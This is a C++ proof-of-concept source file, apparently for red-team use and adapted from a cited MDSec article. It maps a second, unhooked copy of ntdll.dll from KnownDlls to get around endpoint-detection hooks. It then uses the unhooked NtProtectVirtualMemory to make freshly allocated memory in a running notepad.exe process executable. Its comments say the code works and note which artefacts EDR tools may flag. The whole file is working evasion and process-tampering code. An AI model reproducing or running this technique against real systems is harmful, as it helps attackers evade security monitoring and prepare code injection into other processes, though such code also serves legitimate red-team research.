// Most code is pulled from here: https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/
// Mapping a new copy of Ntdll into the process and calling the unhooked NtProtectVirtualMemory
// Code is dirty but it works
// ntdll.dll will be loaded into the process the second time --> this might be a red flag for some EDRs
// dual loaded ntdll.dll memory range and memory range for the original ntdll.dll are different - another red flag for some EDRs

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <TlHelp32.h>

#define RVA2VA(type, base, rva)(type)((ULONG_PTR)base + rva)

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef NTSTATUS(NTAPI* pNtOpenSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS(NTAPI* pNtClose)(HANDLE Handle);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef void(WINAPI* pRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T* NumberOfBytes, ULONG NewProtection, PULONG OldProtection);

DWORD FindProcID(const wchar_t* procname);
LPVOID WINAPI GetProcAddressFromEAT(LPVOID DllBase, const char* FunctionName);

int main()
{
    NTSTATUS status;
    LARGE_INTEGER SectionOffset;
    SIZE_T ViewSize;
    PVOID ViewBase;
    HANDLE SectionHandle;
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING KnownDllsNtDllName;
    FARPROC Function;
    PCWSTR temp = L"\\KnownDlls\\ntdll.dll";

    pNtOpenSection NtOpenSection = (pNtOpenSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    pNtClose NtClose = (pNtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    pRtlInitUnicodeString RtlInitUnicodeString1 = (pRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

    RtlInitUnicodeString1(&KnownDllsNtDllName, temp);
    InitializeObjectAttributes(&ObjectAttributes, &KnownDllsNtDllName, OBJ_CASE_INSENSITIVE, 0, NULL);

    status = NtOpenSection(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_QUERY, &ObjectAttributes);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenSection fail.\n");
        return 1;
    }

    SectionOffset.LowPart = 0;
    SectionOffset.HighPart = 0;

    ViewSize = 0;
    ViewBase = NULL;

    status = NtMapViewOfSection(SectionHandle, GetCurrentProcess(), &ViewBase, 0, 0, &SectionOffset, &ViewSize, ViewShare, 0, PAGE_EXECUTE_READ);
   
    if (!NT_SUCCESS(status)) {
        printf("[-] NtMapViewOfSection failed.\n");
        return 1;
    }

    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddressFromEAT(ViewBase, "NtProtectVirtualMemory");
    
    DWORD pid = 0;
    DWORD OldProtection;
    SIZE_T Size = 0x400;

    pid = FindProcID(L"notepad.exe");
    HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID TestMemory = VirtualAllocEx(hRemoteProcess ,NULL, Size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    printf("[+] Calling NtProtectVirtualMemory located at 0x%p\n", NtProtectVirtualMemory);
    NtProtectVirtualMemory(hRemoteProcess, &TestMemory, &Size, PAGE_EXECUTE_READWRITE, &OldProtection);

    if (ViewBase != NULL) {
        NtUnmapViewOfSection(GetCurrentProcess(), ViewBase);
    }

    if (SectionHandle != NULL) {
        NtClose(SectionHandle);
    }

    return 0;
}

DWORD FindProcID(const wchar_t* procname)
{
    int pid = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    BOOL bResult = Process32First(hSnapshot, &pe);

    while (bResult) {
        if (wcscmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }

        bResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

LPVOID WINAPI GetProcAddressFromEAT(LPVOID DllBase, const char* FunctionName)
{
    PIMAGE_DOS_HEADER       DosHeader;
    PIMAGE_NT_HEADERS       NtHeaders;
    DWORD                   NumberOfNames, VirtualAddress;
    PIMAGE_DATA_DIRECTORY   DataDirectory;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory;
    PDWORD                  Functions;
    PDWORD                  Names;
    PWORD                   Ordinals;
    PCHAR                   Name;
    LPVOID                  ProcAddress = NULL;

    DosHeader = (PIMAGE_DOS_HEADER)DllBase;
    NtHeaders = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
    DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
    VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    if (VirtualAddress == 0) return NULL;

    ExportDirectory = RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);
    NumberOfNames = ExportDirectory->NumberOfNames;

    if (NumberOfNames == 0) return NULL;

    Functions = RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    Names = RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    Ordinals = RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    do {
        Name = RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
        if (lstrcmpA(Name, FunctionName) == 0) {
            ProcAddress = RVA2VA(LPVOID, DllBase, Functions[Ordinals[NumberOfNames - 1]]);
            return ProcAddress;
        }
    } while (--NumberOfNames && ProcAddress == NULL);

    return ProcAddress;
}
